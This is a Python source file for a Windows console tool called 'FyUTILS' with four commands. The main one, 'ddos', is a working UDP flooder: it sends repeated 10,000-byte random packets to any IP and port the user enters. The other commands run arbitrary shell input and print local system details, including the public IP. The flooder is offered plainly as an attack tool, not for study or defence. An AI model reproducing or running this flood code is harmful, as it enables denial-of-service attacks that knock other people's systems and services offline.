import os, socket, random, time, platform, string, requests, keyboard

from colorama import Fore, init

init(convert=True)


def rndm(size=40, chars=string.ascii_uppercase + string.digits):
    return "".join(random.choice(chars) for _ in range(size))


keyboard.press_and_release("f11")
time.sleep(0.3)
print(Fore.CYAN + "  ______  __     __  _    _   _______   _____   _         _____               _  _          ___      _____            _     _                         ______       _   _   _     _")
time.sleep(0.1)
print(Fore.CYAN + " |  ____| \ \   / / | |  | | |__   __| |_   _| | |       / ____|             | || |        / _ \    |  __ \          | |   | |                       |  ____|     | | (_) | |   (_)")
time.sleep(0.1)
print(Fore.CYAN + " | |__     \ \_/ /  | |  | |    | |      | |   | |      | (___     __   __   | || |_      | | | |   | |__) |  _   _  | |_  | |__     ___    _ __     | |__      __| |  _  | |_   _    ___    _ __")
time.sleep(0.1)
print(Fore.CYAN + " |  __|     \   /   | |  | |    | |      | |   | |       \___ \    \ \ / /   |__   _|     | | | |   |  ___/  | | | | | __| | '_ \   / _ \  | '_ \    |  __|    / _` | | | | __| | |  / _ \  | '_ \ ")
time.sleep(0.1)
print(Fore.CYAN + " | |         | |    | |__| |    | |     _| |_  | |____   ____) |    \ V /       | |    _  | |_| |   | |      | |_| | | |_  | | | | | (_) | | | | |   | |____  | (_| | | | | |_  | | | (_) | | | | |")
time.sleep(0.1)
print(Fore.CYAN + " |_|         |_|     \____/     |_|    |_____| |______| |_____/      \_/        |_|   (_)  \___/    |_|       \__, |  \__| |_| |_|  \___/  |_| |_|   |______|  \__,_| |_|  \__| |_|  \___/  |_| |_|")
time.sleep(0.1)
print(Fore.CYAN + "                                                                                                               __/ |")
time.sleep(0.1)
print(Fore.CYAN + "                                                                                                              |___/")
time.sleep(0.1)
print("")
time.sleep(0.1)
print(Fore.CYAN + "=====================================================================================================================================================================================================")
time.sleep(0.1)
print(Fore.CYAN + "Available commands: ddos, shell, exit, sys")
time.sleep(0.1)
print(Fore.CYAN + "=====================================================================================================================================================================================================")
time.sleep(0.1)
print("")
time.sleep(0.1)
cmd = input(Fore.CYAN + os.getlogin() + "\FyUTILS >> ")
print("")

if cmd == "ddos":
    sckt = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print(Fore.CYAN + "=====================================================================================================================================================================================================")
    time.sleep(0.1)
    ip = input(Fore.CYAN + "Target IP >> ")
    time.sleep(0.1)
    port = int(input(Fore.CYAN + "Target Port >> "))
    time.sleep(0.1)
    queries = int(input(Fore.CYAN + "Packets >> "))
    time.sleep(0.1)
    print(Fore.CYAN + "=====================================================================================================================================================================================================")
    time.sleep(0.1)
    print("")

    sckt.connect((ip, port))

    for i in range(queries + 1):
        sckt.send(random.randbytes(10) * 1000)
        print(Fore.CYAN + f"Send packages: {i}", end='\r')
    time.sleep(1)
    print(Fore.CYAN + "Attempting to restart...")
    time.sleep(2)
    os.system("start %userprofile%\FyUTILS\src\FyUTILS-4.py")
    time.sleep(2)
    exit()

if cmd == "shell":
    print(Fore.CYAN + "=====================================================================================================================================================================================================")
    time.sleep(0.1)
    print(Fore.CYAN + "FyUTILS windows shell - exit to get back")
    time.sleep(0.1)
    print(Fore.CYAN + "=====================================================================================================================================================================================================")
    time.sleep(0.1)
    print("")
    shell = input(os.getlogin() + "\FySHELL >> ")
    if shell == "exit":
        os.system("start %userprofile%\FyUTILS\src\FyUTILS-4.py")
        time.sleep(2)
        exit()
    else:
        os.system(shell)
        print("")
        os.system("pause")
        os.system("start %userprofile%\FyUTILS\src\FyUTILS-4.py")
        time.sleep(1)
        keyboard.write("shell")
        time.sleep(0.5)
        keyboard.press_and_release("enter")
        exit()

if cmd == "exit":
    print(Fore.CYAN + "=====================================================================================================================================================================================================")
    time.sleep(0.1)
    print(Fore.CYAN + "FyUTILS will shutdown in 5 seconds!")
    time.sleep(0.1)
    print(Fore.CYAN + "=====================================================================================================================================================================================================")
    time.sleep(0.1)
    print("")
    time.sleep(0.3)
    print(Fore.CYAN + "Exit in 5", end='\r')
    time.sleep(1)
    print(Fore.CYAN + "Exit in 4", end='\r')
    time.sleep(1)
    print(Fore.CYAN + "Exit in 3", end='\r')
    time.sleep(1)
    print(Fore.CYAN + "Exit in 2", end='\r')
    time.sleep(1)
    print(Fore.CYAN + "Exit in 1", end='\r')
    time.sleep(1)
    exit()

if cmd == "sys":
    publicip = requests.get("https://api.ipify.org").content.decode("UTF8")
    print(Fore.CYAN + "=====================================================================================================================================================================================================")
    time.sleep(0.1)
    print(Fore.CYAN + "FyUTILS system specifications:")
    time.sleep(0.1)
    print(Fore.CYAN + "User: " + os.getlogin())
    time.sleep(0.1)
    print(Fore.CYAN + "Device: " + socket.gethostname())
    time.sleep(0.1)
    print(Fore.CYAN + "Private IP: " + socket.gethostbyname(socket.gethostname()))
    time.sleep(0.1)
    print(Fore.CYAN + "Public IP: " + publicip)
    time.sleep(0.1)
    print(Fore.CYAN + "Processor: " + platform.processor())
    time.sleep(0.1)
    print(Fore.CYAN + "More features coming soon (FyUTILS on v4.0)")
    time.sleep(0.1)
    print(Fore.CYAN + "=====================================================================================================================================================================================================")
    time.sleep(0.1)
    print("")
    os.system("pause")
    os.system("start %userprofile%\FyUTILS\src\FyUTILS-4.py")
    time.sleep(2)
    exit()

else:
    print(Fore.RED + "Unknown command!")
    time.sleep(1)
    os.system("start %userprofile%\FyUTILS\src\FyUTILS-4.py")
    time.sleep(2)
    exit()